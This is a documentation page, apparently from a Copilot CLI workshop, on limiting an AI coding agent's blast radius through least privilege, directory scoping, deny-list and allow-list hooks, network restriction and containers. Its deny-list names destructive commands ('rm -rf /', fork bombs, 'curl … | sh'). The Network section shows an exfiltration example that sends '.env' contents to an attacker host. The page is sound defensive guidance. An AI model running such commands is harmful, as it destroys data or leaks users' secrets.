# Blast-radius limiting

Hooks and approval prompts catch *known* bad patterns. This page is the
defense-in-depth layer underneath: **how to bound what Copilot can do in the
worst case, even if a hook missed something and you hit `y` by mistake.**

The principle is the same as least-privilege for any other automation: give
the agent the smallest environment in which it can still do its job.

## Run unprivileged { #run-unprivileged }

| Do | Don't |
|---|---|
| Run `copilot` as a normal user account. | Run as `root`, in a container started with `--privileged`, or via `sudo copilot`. |
| Keep credential files (`~/.ssh`, `~/.aws`, `~/.kube`, `.env*`) at `chmod 600`. | Leave `.env` readable by the user Copilot runs as if you don't want it read. |
| Use short-lived tokens (`gh auth refresh`, AWS STS, GCP `application-default`). | Use long-lived PATs with broad scopes. |
| If you need elevation, exit the session, run the privileged step manually, then resume. | Add the Copilot user to `sudoers`. |

In Codespaces / dev containers this is mostly given to you for free. On a
personal laptop it's an active choice.

## Scope the working directory

The agent's default `cwd` is wherever you started `copilot`. Start it **inside
a single project**, not your home directory:

```bash
cd ~/work/some-feature-branch
copilot                  # cwd = ~/work/some-feature-branch
```

vs:

```bash
cd ~
copilot                  # cwd = ~  → much wider blast radius
```

For one-off agentic tasks on untrusted input, use a fresh scratch directory:

```bash
mkdir -p /tmp/copilot-scratch-$(date +%s) && cd $_
copilot
```

## Deny-list hook { #deny-list-hook }

The canonical "don't blindly approve" mechanism. Full walkthrough +
copy-paste files: [`examples/hooks/deny-dangerous-commands/`](https://github.com/ChibaYuki347/copilot-harness-workshop/tree/main/examples/hooks/deny-dangerous-commands).

Minimal install:

```bash
mkdir -p .github/hooks/deny-dangerous-commands
cp examples/hooks/deny-dangerous-commands/* .github/hooks/deny-dangerous-commands/
chmod +x .github/hooks/deny-dangerous-commands/check-bash.sh
```

What it blocks (default — tune to your team):

- `rm -rf /` / `rm -rf ~` / `rm -rf $HOME`
- `curl … | sh`, `wget … | sh`
- fork bomb, `mkfs`, raw `dd` to a disk device
- `chmod 777 /`, `chown … /`

What it forces re-confirm:

- `git push --force*`, `git reset --hard`, `git clean -fd`
- `sudo …`
- `gh repo delete`, `gh secret set`
- `terraform apply|destroy`, `kubectl delete ns`, `docker system prune`

The hook is `preToolUse` scoped to the `bash` tool only — add separate entries
to `hooks.json` if you also want to gate `edit` or specific MCP tools.

### Cross-host

The same `.github/hooks/*.json` works in both Copilot CLI and VS Code Copilot
Chat Preview. See [Hooks → VS Code variant](../customizations/hooks.md#vs-code-variant).

## Allow-list shell

Instead of (or in addition to) a deny-list, you can flip the default to "only
these specific bash prefixes are allowed":

```bash
copilot \
  --allow-tool 'bash(npm test:*)' \
  --allow-tool 'bash(pytest:*)' \
  --allow-tool 'bash(git status:*)' \
  --allow-tool 'bash(git diff:*)' \
  --allow-tool 'bash(git log:*)' \
  --allow-tool 'bash(ls *:*)' \
  --allow-tool 'view'
```

Anything outside the allow-list goes through the normal approval prompt — the
agent can still propose `rm`, you just have to type `y`.

Combine allow-list with the deny-list hook for layered defense:

- **Allow-list** scopes auto-approval ("only test runners run silently").
- **Deny-list hook** still vetoes regardless of approval ("`rm -rf /` is never
  OK, even if I hit `y`").

## Network { #network }

The single most impactful blast-radius lever, and the most overlooked.

Threats:

- A bash command that exfiltrates (`curl https://attacker.example/?$(cat .env)`).
- An MCP server that uploads tool inputs you didn't audit.
- A model fetching a URL whose response is then used as authoritative input.

Mitigations, in order of strength:

1. **Run in a network-restricted container.** `podman run --network=none …`
   for sessions where the agent doesn't need internet at all (most pure-coding
   sessions). Or a sidecar firewall that only allows your package registry,
   GitHub, and the LLM endpoint.
2. **DNS allow-list.** A local resolver (`unbound`, `dnsmasq`) that only
   answers for `github.com`, `api.github.com`, `registry.npmjs.org`,
   `pypi.org`, `*.copilot.com`. Sinkhole the rest. The agent's `curl` to an
   unknown host fails with NXDOMAIN.
3. **Block `curl` / `wget` to non-HTTPS or to IPs by deny-list hook.** Cheaper
   than a real firewall; trivially bypassed if the agent uses `python -c …`
   instead. Use as belt-and-braces.

For high-sensitivity work (writing for a regulated codebase, working with
production credentials), default to option 1.

## Sandboxed filesystem

Two patterns:

- **Per-task scratch directory** (no setup). Start `copilot` in a temp dir.
  Worst case stays bounded.
- **Container with a single bind-mount** (more setup, much stronger). Mount
  only the repo you want the agent to touch:

  ```bash
  podman run --rm -it \
    --network=none \
    -v "$PWD:/work:Z" \
    -w /work \
    -e GITHUB_TOKEN \
    ghcr.io/your-org/copilot-sandbox:latest copilot
  ```

  The agent can write anywhere it likes — `/`, `~`, `/etc` — but the writes
  are inside the container and discarded on exit.

## Quick checklist

Before starting an agent-mode session on something you care about:

- [ ] Running as non-root, with credentials at `chmod 600`.
- [ ] Started in the **project directory**, not `~`.
- [ ] `deny-dangerous-commands` hook installed (or equivalent).
- [ ] `audit-all-tool-calls` hook installed (you'll want the log later).
- [ ] If the project is sensitive: network-restricted container or DNS allow-list.
- [ ] Approval prompts visible — not minimized, not in a tab you've forgotten.

## See also

- [Risk mental model](./risk-mental-model.md)
- [Approval cheat sheet](./approval-cheatsheet.md)
- [Auditing](./auditing.md)
- [Recipe → session-end secret scan](../recipes/session-end-secret-scan.md)
